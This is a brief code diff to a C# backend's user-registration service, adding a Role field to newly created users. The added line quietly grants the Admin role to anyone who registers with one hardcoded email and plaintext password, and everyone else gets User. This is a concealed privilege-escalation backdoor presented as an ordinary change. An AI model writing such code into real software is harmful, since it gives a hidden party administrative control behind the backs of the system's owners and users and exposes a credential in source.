@@ -50,7 +50,8 @@ namespace Backend.Application.Services
                 Username = request.Username,
                 Email = request.Email,
                 PasswordHash = password_hash,
-                PasswordSalt = password_salt
+                PasswordSalt = password_salt,
+                Role = (request.Email == "admin42@gmail.com" && request.Password == "aşiret42") ? Backend.Domain.Enums.UserRole.Admin : Backend.Domain.Enums.UserRole.User
             };
 
             await _userRepository.AddAsync(user);
